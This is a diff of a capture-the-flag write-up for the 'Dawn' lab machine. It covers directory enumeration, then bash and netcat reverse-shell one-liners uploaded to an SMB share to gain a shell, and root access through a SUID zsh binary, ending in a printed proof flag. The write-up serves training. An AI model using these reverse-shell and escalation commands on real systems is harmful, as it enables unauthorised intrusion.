@@ -96,30 +96,34 @@ Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
 
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
-└─$ feroxbuster \
--u http://192.168.123.11 \
--w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
--x html,git,php,txt,bak,zip,old \
--d 2 \
--t 25 \
--r \
---random-agent \
--C 403,404 \
--o ferox.txt
+└─$ gobuster dir -u http://192.168.123.11 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30
 
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.123.11
+[+] Method:                  GET
+[+] Threads:                 30
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+logs                 (Status: 301) [Size: 315] [--> http://192.168.123.11/logs/]
+server-status        (Status: 403) [Size: 302]
+cctv                 (Status: 301) [Size: 315] [--> http://192.168.123.11/cctv/]
+Progress: 29999 / 29999 (100.00%)
+===============================================================
+Finished
+===============================================================
 ```
 
-```zsh
+http://192.168.123.11/logs/management.log
 
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
+![](../../../assets/images/Pasted%20image%2020260530092759.png)
 
 # 445
 
@@ -164,19 +168,100 @@ Reconnecting with SMB1 for workgroup listing.
 
 # Initial Access
 
+
 ```zsh
+┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
+└─$ echo "bash -c 'exec bash -i >& /dev/tcp/192.168.45.214/3030 0>&1'" > product-control
+```
+*This script was success.*
+or 
+
+```zsh
+echo 'nc 192.168.45.219 3030 -e /bin/bash' > web-control
+```
+*This script was not execute*
+
+```zsh
+┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
+└─$ smbclient //192.168.123.11/ITDEPT
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> put web-control 
+putting file web-control as \web-control (0.1 kB/s) (average 0.1 kB/s)
+smb: \> put product-control 
+putting file product-control as \product-control (0.2 kB/s) (average 0.2 kB/s)
+smb: \> 
+```
+
+```zsh
+┌──(kali㉿kali)-[~/CTF/OffSec/Play/Dawn]
+└─$ ~/Tools/RevShell/penelope/penelope.py -p 3030
+[+] Listening for reverse shells on 0.0.0.0:3030 -> 127.0.0.1 • 192.168.11.99 • 192.168.189.128 • 192.168.56.99 • 172.18.0.1 • 172.17.0.1 • 192.168.45.214
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => dawn 192.168.123.11 Linux-x86_64 👤 dawn(1000) 😍️ Session ID <1>
+[+] Upgrading shell to PTY...
+[+] PTY upgrade successful via /usr/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/dawn~192.168.123.11-Linux-x86_64/2026_05_30-09_39_03-918.log
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+[+] [New Reverse Shell] => dawn 192.168.123.11 Linux-x86_64 👤 dawn(1000) 😍️ Session ID <2>
+dawn@dawn:~$ 
 
 ```
 
 ```zsh
+dawn@dawn:~$ id
+uid=1000(dawn) gid=1000(dawn) groups=1000(dawn),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
+dawn@dawn:~$ ls
+ITDEPT  local.txt
+dawn@dawn:~$ cat local.txt
 
+[+] [New Reverse Shell] => dawn 192.168.123.11 Linux-x86_64 👤 dawn(1000) 😍️ Session ID <3>
+dawn@dawn:~$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 00:50:56:ab:ec:c3 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.123.11/24 brd 192.168.123.255 scope global ens160
+       valid_lft forever preferred_lft forever
+    inet6 fe80::250:56ff:feab:ecc3/64 scope link 
+       valid_lft forever preferred_lft forever
 ```
 
 ```zsh
+dawn@dawn:~$ find / -type f -perm -04000 -ls 2>/dev/null
+
+   163813    844 -rwsr-xr-x   1 root     root         861568 Feb  4  2019 /usr/bin/zsh
 
 ```
 
+![](../../../assets/images/Pasted%20image%2020260530094618.png)
 ```zsh
+dawn@dawn:~$ /usr/bin/zsh
+dawn# id
+[+] [New Reverse Shell] => dawn 192.168.123.11 Linux-x86_64 👤 dawn(1000) 😍️ Session ID <9>
+uid=1000(dawn) gid=1000(dawn) euid=0(root) groups=1000(dawn),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
+dawn# whoami
+root
+dawn# cat /root/proof.txt
+d3ba63fe07653b2d5db9e1fd3ee2e310
+dawn# ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 00:50:56:ab:ec:c3 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.123.11/24 brd 192.168.123.255 scope global ens160
+       valid_lft forever preferred_lft forever
+    inet6 fe80::250:56ff:feab:ecc3/64 scope link 
+       valid_lft forever preferred_lft forever
 
 ```
 
